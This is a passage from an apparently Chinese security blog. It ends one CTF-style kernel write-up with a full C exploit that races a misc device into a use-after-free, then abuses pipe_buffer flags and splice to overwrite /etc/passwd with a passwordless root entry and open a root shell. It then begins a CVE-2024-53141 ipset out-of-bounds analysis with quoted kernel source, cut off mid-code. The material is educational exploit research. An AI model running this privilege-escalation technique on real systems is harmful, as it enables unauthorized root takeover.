class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> *addr;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 400</span></span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">400</span>][<span class="number">2</span>];</span><br><span class="line"><span class="type">atomic_int</span> uaf_detected = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *p = (<span class="type">unsigned</span> <span class="type">char</span>*)addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, p[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_pattern</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[PAGE_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(buf, PATTERN, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alimem_write</span> <span class="title">wr</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .offset = <span class="number">0</span>,</span><br><span class="line">        .data = buf,</span><br><span class="line">        .size = <span class="keyword">sizeof</span>(buf)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, ALIMEM_WRITE, &amp;wr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;write error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_zero</span><span class="params">(<span class="type">void</span> *addr)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *p = (<span class="type">char</span>*)addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[i] != <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">atomic_store</span>(&amp;uaf_detected, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mapper_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> idx = *(<span class="type">int</span>*)arg;</span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, idx * PAGE_SIZE);</span><br><span class="line">    usleep(<span class="number">500</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr != MAP_FAILED) &#123;</span><br><span class="line">        usleep(<span class="number">50000</span>);</span><br><span class="line">        check_zero(addr);</span><br><span class="line">        <span class="keyword">if</span>(!uaf_detected)</span><br><span class="line">            munmap(addr, PAGE_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> idx, attempt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((fd = open(DEV_PATH, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;device open failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Start to trigger racing bug...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="type">atomic_load</span>(&amp;uaf_detected) &amp;&amp; attempt++ &lt; MAX_ATTEMPTS) &#123;</span><br><span class="line">        idx = ioctl(fd, ALIMEM_ALLOC);</span><br><span class="line">        <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        write_pattern(idx);</span><br><span class="line">        </span><br><span class="line">        pthread_create(&amp;tid, <span class="literal">NULL</span>, mapper_thread, &amp;idx);</span><br><span class="line">        usleep(<span class="number">50</span>); <span class="comment">// 精确控制竞争窗⼝</span></span><br><span class="line">        ioctl(fd, ALIMEM_FREE, &amp;idx);</span><br><span class="line">        </span><br><span class="line">        pthread_join(tid, <span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (attempt) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] try %d times...\r&quot;</span>, attempt);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="type">atomic_load</span>(&amp;uaf_detected)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[+] UAF detected, try times: %d\n&quot;</span>, attempt);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[-] UAF detected error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">4</span> * <span class="number">0x1000</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> target_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(target_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="type">loff_t</span> offset = i;</span><br><span class="line">        <span class="type">ssize_t</span> nbytes = splice(target_fd, &amp;offset, pipe_fd[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((ptr = memmem(addr, <span class="number">0x1000</span>, <span class="string">&quot;\xff\xff&quot;</span>, <span class="number">2</span>))) &#123;</span><br><span class="line">        hexdump(ptr - <span class="number">6</span>, <span class="number">0x40</span>);</span><br><span class="line">        found = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (found) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pp</span> =</span> (<span class="keyword">struct</span> pipe_buffer *)(ptr - <span class="number">6</span>);</span><br><span class="line">        pp-&gt;len = <span class="number">0</span>;</span><br><span class="line">        pp-&gt;offset = <span class="number">0</span>;</span><br><span class="line">        pp-&gt;flags |= <span class="number">0x10</span>;</span><br><span class="line">        hexdump(ptr - <span class="number">6</span>, <span class="number">0x40</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[-] UAF pipe_buffer error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *r00t = <span class="string">&quot;root::0:0:root:/root:/bin/sh\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], r00t, <span class="built_in">strlen</span>(r00t)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="四-疑难问题"><a href="#四-疑难问题" class="headerlink" title="四. 疑难问题"></a>四. 疑难问题</h1><p>​	由于busybox中加入了s这个权限，所以导致直接利用cpio进行打包的时候无法重新模拟，之后因此去除了suid的权限，但是会导致后面执行完覆盖&#x2F;etc&#x2F;passwd后无法使用su命令切换成root用户。</p>
<p><img src="/images/alimem/1741173882219.jpg" alt="1741173882219"></p>
<p>​	但是可以通过cat &#x2F;etc&#x2F;passwd观察到，已经覆盖为指定内容的数据了。</p>
<p><img src="/images/alimem/1741173955066.jpg" alt="1741173955066"></p>
<p>​	多出来的回车其实是之前的root多了一个x由于这里没有覆盖之前的\n导致出现空行。</p>
<h1 id="五-总结"><a href="#五-总结" class="headerlink" title="五. 总结"></a>五. 总结</h1><p>​	通过本题的复现，我们可以清楚的掌握如何编写一个模拟内存分配的misc设备，并且如何防止多线程造成的问题（加入rcu写锁）,最后也就是如何利用splice函数实现不用泄露程序基地址就可以直接实现覆盖&#x2F;etc&#x2F;passwd，进而实现权限提升，本题难度不大，但是也掌握到了一定的漏洞利用方式。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/CVE-2024-53141/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/02/07/CVE-2024-53141/" class="post-title-link" itemprop="url">CVE-2024-53141</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2026-02-07 09:50:00 / Modified: 10:10:47" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:00+08:00">2026-02-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>23 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CVE-2024-53141"><a href="#CVE-2024-53141" class="headerlink" title="CVE-2024-53141"></a>CVE-2024-53141</h1><h1 id="一-漏洞背景"><a href="#一-漏洞背景" class="headerlink" title="一.漏洞背景"></a>一.漏洞背景</h1><p>​	该漏洞产生于ip_set的功能中由于在使用无类域间路由来更新ipset的bitmap集合的时候，并没有对于设置完掩码之后的更新ip地址与创建ip_set的初始地址进行比较，导致可以从一个异常的Ip地址开始进行插入，并且由于存在一个32位的int强制转化成16位，导致实现对于bitmap的异常访问，导致可以越界写一个堆地址，通过构造msg_msg以及sk_buff可以使得最终实现UAF漏洞。这个漏洞存在的范围很长从v2.7 - v6.12，但是实际上在复现的过程中发现，对于kernel版本是5之前的，不支持ip_set 7，并且强行cmp比对，因此对于后面的脚本需要修改到ip_set 6才可以打通。</p>
<h3 id="1-1-ip-set介绍"><a href="#1-1-ip-set介绍" class="headerlink" title="1.1 ip_set介绍"></a>1.1 ip_set介绍</h3><p>​	这里借用<a target="_blank" rel="noopener" href="https://u1f383.github.io/linux/2025/01/07/cve-2024-53141-an-oob-write-vulnerability-in-netfilter-ipset.html">链接</a>的部分内容，主要是对于Ip_set创建以及更新的部分进行讲解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ip_set(inst, id)        \</span></span><br><span class="line"><span class="meta">    ip_set_dereference(inst)[id]</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ip_set_create</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="type">const</span> <span class="keyword">struct</span> nfnl_info *info,</span></span><br><span class="line"><span class="params">             <span class="type">const</span> <span class="keyword">struct</span> nlattr * <span class="type">const</span> attr[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_set_net</span> *<span class="title">inst</span> =</span> ip_set_pernet(info-&gt;net);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_set</span> *<span class="title">set</span>, *<span class="title">clash</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    name = nla_data(attr[IPSET_ATTR_SETNAME]);</span><br><span class="line">    typename = nla_data(attr[IPSET_ATTR_TYPENAME]);</span><br><span class="line">    family = nla_get_u8(attr[IPSET_ATTR_FAMILY]);</span><br><span class="line">    revision = nla_get_u8(attr[IPSET_ATTR_REVISION]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">set</span> = kzalloc(<span class="keyword">sizeof</span>(*<span class="built_in">set</span>), GFP_KERNEL); <span class="comment">// [3]</span></span><br><span class="line">    strscpy(<span class="built_in">set</span>-&gt;name, name, IPSET_MAXNAMELEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    ret = find_set_type_get(typename, family, revision, &amp;<span class="built_in">set</span>-&gt;type); <span class="comment">// [4]</span></span><br><span class="line"></span><br><span class="line">    ret = <span class="built_in">set</span>-&gt;type-&gt;create(info-&gt;net, <span class="built_in">set</span>, tb, flags); <span class="comment">// [5]</span></span><br><span class="line"></span><br><span class="line">    ret = find_free_id(inst, <span class="built_in">set</span>-&gt;name, &amp;index, &amp;clash); <span class="comment">// [6]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    ip_set(inst, index) = <span class="built_in">set</span>; <span class="comment">// [7]</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 Linux 内核的 Netfilter 子系统 IP 集合（ip_set）框架中，ip_set_create 函数负责根据用户态传入的配置参数动态创建新的集合实例。以 bitmap:ip 类型为例，其核心流程始于从 Netlink 消息中提取关键参数：用户指定的集合名称（name）、类型标识符（typename，如 “bitmap:ip”）、地址族（family，通常为 AF_INET）及版本号（revision）。内核首先通过 kzalloc 分配 ip_set 结构体内存并初始化基础属性，随后调用 find_set_type_get 在全局注册的类型列表中匹配与 typename 和 revision 对应的集合类型操作集（struct ip_set_type），这一过程隐式验证了类型合法性。完成类型绑定后，内核触发类型专属的 create 回调函数（如 bitmap_ip_create），由该函数解析类型相关的扩展参数（如 IP 范围、位图尺寸）并初始化类型私有数据结构。最后，通过 find_free_id 在全局实例表中分配唯一索引，将新创建的集合插入 ip_set_net 的二维指针数组完成注册，漏洞点发生在bitmap的创建和插入过程中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ip_set_uadd</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="type">const</span> <span class="keyword">struct</span> nfnl_info *info,</span></span><br><span class="line"><span class="params">               <span class="type">const</span> <span class="keyword">struct</span> nlattr * <span class="type">const</span> attr[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ip_set_ad(info-&gt;net, info-&gt;sk, skb,</span><br><span class="line">             IPSET_ADD, info-&gt;nlh, attr, info-&gt;extack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ip_set_ad</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *ctnl,</span></span><br><span class="line"><span class="params">             <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">             <span class="keyword">enum</span> ipset_adt adt,</span></span><br><span class="line"><span class="params">             <span class="type">const</span> <span class="keyword">struct</span> nlmsghdr *nlh,</span></span><br><span class="line"><span class="params">             <span class="type">const</span> <span class="keyword">struct</span> nlattr * <span class="type">const</span> attr[],</span></span><br><span class="line"><span class="params">             <span class="keyword">struct</span> netlink_ext_ack *extack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_set</span> *<span class="title">set</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> = find_set(inst, nla_data(attr[IPSET_ATTR_SETNAME])); <span class="comment">// [8]</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    nla_parse_nested(tb, IPSET_ATTR_ADT_MAX,</span><br><span class="line">                     attr[IPSET_ATTR_DATA],</span><br><span class="line">                     <span class="built_in">set</span>-&gt;type-&gt;adt_policy, <span class="literal">NULL</span>);</span><br><span class="line">    ret = call_ad(net, ctnl, skb, <span class="built_in">set</span>, tb, adt, flags, <span class="comment">// [9]</span></span><br><span class="line">                  use_lineno);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">call_ad</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *ctnl, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[], <span class="keyword">enum</span> ipset_adt adt,</span></span><br><span class="line"><span class="params">    u32 flags, <span class="type">bool</span> use_lineno)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ip_set_lock(<span class="built_in">set</span>);</span><br><span class="line">        ret = <span class="built_in">set</span>-&gt;variant-&gt;uadt(<span class="built_in">set</span>, tb, adt, &amp;lineno, flags, retried); <span class="comment">// [10]</span></span><br><span class="line">        ip_set_unlock(<span class="built_in">set</span>);</span><br><span class="line">        retried = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="comment">/*...*/</span>);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 Netfilter IP 集合的成员操作流程中，ip_set_uadd 作为用户态添加元素请求的入口函数，通过 ip_set_ad 间接完成核心操作。该函数首先根据集合名称从全局实例表（ip_set_net）中查找目标集合对象（find_set），随后解析嵌套的 Netlink 属性（nla_parse_nested）以提取待操作数据（如 IP 地址、端口范围等）。最终通过 call_ad 触发类型特定的操作函数（set-&gt;variant-&gt;uadt），在持有集合锁（ip_set_lock）的同步上下文中执行原子化的位图更新、哈希表插入等底层操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bitmap_ip_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[],</span></span><br><span class="line"><span class="params">         u32 flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP], &amp;first_ip);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (tb[IPSET_ATTR_IP_TO]) &#123;</span><br><span class="line">        ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP_TO], &amp;last_ip);</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tb[IPSET_ATTR_NETMASK]) &#123;</span><br><span class="line">        netmask = nla_get_u8(tb[IPSET_ATTR_NETMASK]);</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mask = range_to_mask(first_ip, last_ip, &amp;mask_bits);</span><br><span class="line">    elements = <span class="number">2UL</span> &lt;&lt; (netmask - mask_bits - <span class="number">1</span>); <span class="comment">// [1]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">map</span> = ip_set_alloc(<span class="keyword">sizeof</span>(*<span class="built_in">map</span>) + elements * <span class="built_in">set</span>-&gt;dsize); <span class="comment">// [2]</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;memsize = BITS_TO_LONGS(elements) * <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="built_in">set</span>-&gt;variant = &amp;bitmap_ip;</span><br><span class="line">    init_map_ip(<span class="built_in">set</span>, <span class="built_in">map</span>, first_ip, last_ip, elements, hosts, netmask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">init_map_ip</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> bitmap_ip *<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">        u32 first_ip, u32 last_ip,</span></span><br><span class="line"><span class="params">        u32 elements, u32 hosts, u8 netmask)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;<span class="built_in">set</span> = <span class="built_in">set</span>;</span><br><span class="line">    <span class="built_in">set</span>-&gt;data = <span class="built_in">map</span>; <span class="comment">// [3]</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 bitmap:ip 类型集合的创建过程中，bitmap_ip_create 函数通过解析用户传入的起始 IP（IPSET_ATTR_IP）、终止 IP（IPSET_ATTR_IP_TO）及子网掩码（IPSET_ATTR_NETMASK）参数，动态计算 IP 地址范围并推导出位图存储的容量需求。关键操作中，内核首先将 IP 范围与掩码结合，通过 range_to_mask 计算实际覆盖的地址段，再以 elements &#x3D; 2UL &lt;&lt; (netmask - mask_bits - 1) 公式确定位图的理论容量。随后通过 ip_set_alloc 分配复合内存结构：除基础 bitmap_ip 结构体外，额外为每个元素预留 set-&gt;dsize 长度的扩展空间，这种弹性设计允许后续功能模块（如 comment 扩展）动态挂载附加数据区（如注释字符串指针）。最终，init_map_ip 将分配的内存与 ip_set 主结构绑定，通过 set-&gt;data &#x3D; map 实现双向关联，同时初始化位图的存储参数（如内存布局、IP 边界），为后续的增删查操作奠定数据基础。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ip_set_mask_from_to(from, to, cidr)    \</span></span><br><span class="line"><span class="meta">do &#123;                                           \</span></span><br><span class="line"><span class="meta">    from &amp;= ip_set_hostmask(cidr);             \</span></span><br><span class="line"><span class="meta">    to = from | ~ip_set_hostmask(cidr);        \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bitmap_ip_uadt</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[],</span></span><br><span class="line"><span class="params">           <span class="keyword">enum</span> ipset_adt adt, u32 *lineno, u32 flags, <span class="type">bool</span> retried)</span></span><br><span class="line">&#123;</span><br><span class="line">    ipset_adtfn adtfn = <span class="built_in">set</span>-&gt;variant-&gt;adt[adt];</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    